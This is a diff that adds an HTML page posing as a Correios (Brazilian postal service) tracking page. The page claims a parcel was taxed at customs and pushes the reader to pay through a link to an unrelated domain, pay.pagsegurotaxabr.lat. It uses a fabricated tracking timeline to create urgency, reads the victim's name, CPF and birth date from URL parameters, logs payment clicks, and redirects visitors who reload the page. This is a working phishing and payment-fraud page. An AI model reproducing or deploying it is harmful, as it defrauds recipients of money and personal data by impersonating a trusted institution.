@@ -1,0 +1,357 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&amp;display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        * {
+            font-family: 'Roboto', sans-serif !important;
+        }
+        :root {
+            --azul: #003366;
+            --azul-escuro: #00294d;
+            --amarelo: #f5b400;
+            body {
+                margin: 0;
+                background: var(--cinza-fundo);
+                color: var(--texto);
+            --cinza-fundo: #f6f7f9;
+            --texto: #1f2937;
+        }
+        body {
+            background: var(--cinza-fundo);
+            color: var(--texto);
+        }
+        .timeline-line {
+            position: absolute;
+            left: 24px;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: var(--amarelo);
+        }
+        .timeline-item {
+            position: relative;
+            padding-left: 60px;
+            padding-bottom: 28px;
+        }
+        .timeline-icon {
+            position: absolute;
+            left: 6px;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            background: var(--amarelo);
+            border: 3px solid #e5e7eb;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+        .timeline-icon.white {
+            background: #fff;
+            border-color: #dfe3e8;
+        }
+        .timeline-icon img {
+            width: 22px;
+            height: 22px;
+        }
+        .main-card {
+            background: transparent;
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+        }
+    </style>
+    <title>Rastreamento - Correios</title>
+</head>
+<body>
+    <!-- Header Acessibilidade -->
+    <header class="p-2 text-[#0066a6] text-xs bg-[#f2f2f2] border-b border-[#e6e6e6]">
+        <span>Acessibilidade <b class="text-xs">▼</b></span>
+    </header>
+
+    <!-- Header Principal -->
+    <header class="bg-[#f5f5f5] p-3 flex items-center justify-between border-b border-[#d9d9d9]">
+        <div class="flex items-center gap-3 text-[#0f6cb6]">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+            </svg>
+        </div>
+        <img src="assets/images/logo.svg" alt="Correios" class="h-8">
+        <img src="assets/images/sair.svg" alt="Sair" class="h-6 opacity-80">
+    </header>
+    <div class="h-[3px] bg-[#f5b400]"></div>
+
+    <!-- Breadcrumb -->
+    <div class="px-4 py-3 text-sm text-gray-700 bg-white border-b border-[#e6e6e6]">
+        <span>Portal Correios</span>
+        <span class="mx-2 text-gray-400">›</span>
+        <span>Rastreamento</span>
+    </div>
+
+    <!-- Conteúdo Principal -->
+    <div class="p-4 bg-white">
+            <!-- Status do Pedido -->
+            <h1 class="text-2xl font-bold text-[#003366] mb-1">STATUS DO PEDIDO:</h1>
+            
+            <h2 class="text-xl font-bold text-[#f5b400] leading-6 mb-4">AGUARDANDO PAGAMENTO<br>(NLBR)</h2>
+            
+            <p class="text-xl mb-2">Olá, <strong></strong></p>
+            
+            <p class="text-gray-700 mb-4">Seu pedido passou por um processo na alfândega e foi taxado.</p>
+
+        <!-- Imagem do Pacote -->
+        <div id="imagemContainer" class="mb-4 hidden">
+            <img id="imagemPedido" src="" alt="Imagem do Pedido" class="w-full max-w-sm mx-auto rounded-md shadow-md">
+        </div>
+        
+        <!-- Texto explicativo -->
+        <p class="text-gray-700 mb-4">Por gentileza, solicitamos a realização do pagamento da taxa, para que, consecutivamente, possamos dar prosseguimento ao envio do seu produto, no prazo de 3 dias úteis.</p>
+        
+        <p class="text-gray-700 mb-4">O pagamento deve ser feito clicando no botão abaixo:</p>
+
+        <!-- Botão de Pagamento -->
+        <a href="https://pay.pagsegurotaxabr.lat/ODAK3Ll2d0D3E6V"><button onclick="trackPaymentClick()" class="w-full bg-[var(--azul)] hover:bg-[var(--azul-escuro)] text-white font-bold py-3 px-4 rounded-md text-sm md:text-base mb-6 transition-colors whitespace-nowrap leading-tight">
+            CLIQUE AQUI PARA EFETUAR O PAGAMENTO
+          </button></a>
+
+        <!-- Prazo de Entrega -->
+        <div class="mb-6">
+            <h3 class="text-sm sm:text-lg font-bold text-[var(--azul)] whitespace-nowrap leading-tight">PRAZO DE ENTREGA APÓS O PAGAMENTO: 3 DIAS ÚTEIS</h3>
+        </div>
+
+        <!-- Timeline de Rastreamento -->
+        <div class="relative mt-8">
+            <div class="timeline-line"></div>
+            
+            <!-- Última tentativa -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#003366]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                </div>
+                <div>
+                    <p class="font-bold text-[var(--azul)]">Última tentativa de regularização do pedido - Redução de valor aplicada</p>
+                    <p class="text-sm text-gray-600">São Paulo - SP</p>
+                    <p class="text-sm text-gray-500">21/02/2026 05:42</p>
+                </div>
+            </div>
+
+            <!-- Devolução ao fornecedor -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#003366]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10a1 1 0 001 1h1m8-1a1 1 0 01-1 1H9m4-1V8a1 1 0 011-1h2.586a1 1 0 01.707.293l3.414 3.414a1 1 0 01.293.707V16a1 1 0 01-1 1h-1m-6-1a1 1 0 001 1h1M5 17a2 2 0 104 0m-4 0a2 2 0 114 0m6 0a2 2 0 104 0m-4 0a2 2 0 114 0" />
+                    </svg>
+                </div>
+                <div>
+                    <p class="font-bold text-[var(--azul)]">Devolução ao fornecedor - não aceita pelo fornecedor</p>
+                    <p class="text-sm text-gray-600">São Paulo - SP</p>
+                </div>
+            </div>
+
+            <!-- Fiscalização aduaneira -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#003366]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                </div>
+                <div>
+                    <p class="font-bold text-[var(--azul)]">Fiscalização aduaneira concluída - pagamento não efetuado pelo destinatário</p>
+                    <p class="text-sm text-gray-600">São Paulo - SP</p>
+                </div>
+            </div>
+
+            <!-- Objeto recebido -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Ccircle cx='32' cy='32' r='28' fill='%23228B22'/%3E%3Ccircle cx='32' cy='20' r='12' fill='%23003366'/%3E%3Crect x='20' y='32' width='24' height='16' fill='%23FFD700'/%3E%3C/svg%3E" alt="Brasil" class="w-6 h-6">
+                </div>
+                <div>
+                    <p class="font-bold text-[var(--azul)]">Objeto recebido pelos Correios do Brasil</p>
+                    <p class="text-sm text-gray-600">São Paulo - SP</p>
+                </div>
+            </div>
+
+            <!-- Objeto em transferência -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#003366]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10a1 1 0 001 1h1m8-1a1 1 0 01-1 1H9m4-1V8a1 1 0 011-1h2.586a1 1 0 01.707.293l3.414 3.414a1 1 0 01.293.707V16a1 1 0 01-1 1h-1m-6-1a1 1 0 001 1h1M5 17a2 2 0 104 0m-4 0a2 2 0 114 0m6 0a2 2 0 104 0m-4 0a2 2 0 114 0" />
+                    </svg>
+                </div>
+                <div>
+                    <p class="font-bold text-[var(--azul)]">Objeto em transferência - por favor aguarde</p>
+                    <p class="text-sm text-gray-600">para Unidade de Tratamento Internacional - BR</p>
+                    <p class="text-sm text-gray-500">CHINA</p>
+                </div>
+            </div>
+
+            <!-- Objeto postado -->
+            <div class="timeline-item" style="padding-bottom: 0;">
+                <div class="timeline-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#003366]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
+                    </svg>
+                </div>
+                <div>
+                    <p class="font-bold text-[var(--azul)]">Objeto postado</p>
+                    <p class="text-sm text-gray-500">CHINA</p>
+                </div>
+            </div>
+    </div>
+
+    <!-- Footer -->
+        <footer class="bg-[#FFB800] mt-8 border-0 shadow-none" style="width:100vw;margin-left:calc(50% - 50vw);padding:24px 24px 28px 24px;box-shadow:none;border:0;">
+            <div class="w-full px-0 py-0 border-0 shadow-none">
+            <div class="mb-6 border-0">
+                <h3 class="text-xl font-bold text-gray-800 mb-4">Fale Conosco</h3>
+                <ul class="space-y-3">
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Registro de Manifestações</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Central de Atendimento</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Soluções para o seu negócio</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Suporte ao cliente com contrato</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Ouvidoria</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Denúncia</a>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="mb-6 border-0">
+                <h3 class="text-xl font-bold text-gray-800 mb-4">Sobre os Correios</h3>
+                <ul class="space-y-3">
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Identidade corporativa</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Educação e cultura</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Código de ética</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Transparência e prestação de contas</a>
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Política de Privacidade e Notas Legais</a>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="mb-6">
+                <h3 class="text-xl font-bold text-gray-800 mb-4">Outros Sites</h3>
+                <ul class="space-y-3">
+                    <li class="flex items-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" />
+                        </svg>
+                        <a href="#" class="text-gray-800">Loja online dos Correios</a>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="text-center pt-4 border-0">
+                <p class="text-sm text-gray-800">© Copyright 2025 Correios</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        (function() {
+            const nav = performance.getEntriesByType && performance.getEntriesByType('navigation')[0];
+            const isReload = (nav && nav.type === 'reload') || (performance.navigation && performance.navigation.type === 1);
+            if (isReload) {
+                window.location.replace('index-2.html');
+            }
+        })();
+
+        function trackPaymentClick() {
+            fetch('includes/tracking.html', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'action=payment_click'
+            });
+            
+            window.location.href = 'https://pay.pagsegurotaxabr.lat/ODAK3Ll2d0D3E6V?name=&amp;document=&amp;telephone=';
+        }
+
+        // Pegar parâmetros da URL e atualizar página
+        const urlParams = new URLSearchParams(window.location.search);
+        const nome = urlParams.get('nome');
+        const cpf = urlParams.get('cpf');
+        const nascimento = urlParams.get('nascimento');
+        const imagem = urlParams.get('imagem');
+
+        if (nome) {
+            document.querySelector('p strong').textContent = nome;
+        }
+
+        if (imagem) {
+            document.getElementById('imagemPedido').src = imagem;
+            document.getElementById('imagemContainer').classList.remove('hidden');
+        }
+
+            </script>
+
+</body>
+
+
+</html>
